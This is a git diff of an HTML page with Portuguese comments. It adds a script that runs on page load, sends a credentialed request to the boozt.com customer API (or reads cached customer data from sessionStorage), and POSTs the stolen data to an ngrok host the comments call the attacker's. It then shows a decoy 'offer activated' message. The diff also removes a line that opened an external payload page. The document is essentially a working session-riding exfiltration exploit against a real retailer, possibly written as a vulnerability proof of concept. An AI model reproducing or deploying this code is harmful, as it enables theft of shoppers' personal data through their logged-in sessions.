@@ -1,10 +1,40 @@
 <!DOCTYPE html>
 <html>
-<head><title>Início do ataque</title></head>
 <body>
     <script>
-        // Abre uma nova janela apontando pro payload real
-        window.open("https://hugo22dr.github.io/payload.html");
+        // Função pra coletar os dados do sessionStorage
+        function stealData() {
+            const customerData = sessionStorage.getItem("customer");
+            if (customerData) {
+                // Dados já estão no sessionStorage, envia direto
+                sendToAttacker(customerData);
+            } else {
+                // Se não tiver, força a requisição pro endpoint
+                const xhr = new XMLHttpRequest();
+                xhr.open("GET", "https://www.boozt.com/at/de-at/api/customer", true);
+                xhr.withCredentials = true; // Envia o PHPSESSID
+                xhr.onload = function() {
+                    if (xhr.status === 200) {
+                        const data = xhr.responseText;
+                        sessionStorage.setItem("customer", data); // Simula o armazenamento
+                        sendToAttacker(data);
+                    }
+                };
+                xhr.send();
+            }
+        }
+
+        // Função pra enviar os dados pro atacante (ngrok)
+        function sendToAttacker(data) {
+            const xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://7e4a-2804-4580-1080-7db-1219-7096-73d0-a45e.ngrok-free.app/collect", true);
+            xhr.setRequestHeader("Content-Type", "application/json");
+            xhr.send(data);
+            document.body.innerHTML = "Oferta ativada! Confira os detalhes.";
+        }
+
+        // Executa ao carregar
+        stealData();
     </script>
 </body>
 </html>
